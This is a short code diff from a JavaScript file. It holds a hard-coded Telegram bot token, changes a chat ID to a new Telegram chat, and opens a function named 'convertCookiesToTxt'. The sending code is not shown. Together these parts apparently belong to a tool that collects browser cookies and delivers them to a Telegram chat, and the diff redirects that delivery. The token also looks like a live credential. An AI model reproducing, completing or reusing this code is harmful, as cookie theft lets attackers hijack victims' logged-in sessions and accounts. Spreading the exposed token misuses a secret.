@@ -1,5 +1,5 @@
 const botToken = "7569934593:AAHmNMG-GKPDMVdJe2NgpcKuvAttcj1u4iA";
-const chatId = "-4616411513";
+const chatId = "-1002608970112";
 
 function convertCookiesToTxt(cookies) {
   let txt = "";
